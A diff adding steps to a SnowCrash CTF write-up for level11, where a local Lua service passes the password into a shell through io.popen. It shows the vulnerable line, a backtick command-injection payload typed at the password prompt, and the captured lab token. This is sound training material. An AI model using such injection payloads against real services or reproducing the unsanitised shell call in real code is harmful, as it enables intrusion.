@@ -41,3 +41,30 @@ while 1 do
   end
   client:close()
 end
+```
+
+### 2. Connect to the servic 
+```bash
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password:
+```
+
+###3. Exploit with command injection
+The vulnerability is in line:
+```bash
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+
+User input is directly concatenated into a shell command. Use backticks or $() to inject commands:
+
+```bash
+Password: `getflag` > /tmp/flag
+```
+
+###4. Read the captured flag
+
+```bash
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
+
